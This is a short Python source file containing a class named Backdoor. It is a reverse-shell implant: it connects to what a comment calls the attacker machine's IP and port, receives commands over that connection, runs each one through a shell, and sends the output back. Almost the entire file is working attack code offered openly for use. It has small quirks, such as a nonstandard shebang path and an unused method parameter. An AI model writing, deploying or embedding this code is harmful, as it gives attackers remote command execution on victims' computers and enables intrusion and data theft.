#!/bin/python3
import socket
import subprocess

class Backdoor:
    # connection.send("\n\n[+] Connection established\n".encode())

    def __init__(self,ipadd, prt):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ipadd, prt))  # attacker machine's IP/Port

    def execute_cmd(self, cmd):
        return subprocess.check_output(cmd, shell=True)

    def run(self, run):
        while True:
            cmd = self.connection.recv(1024).decode()
            cmd_res = self.execute_cmd(cmd)
            self.connection.send(cmd_res)






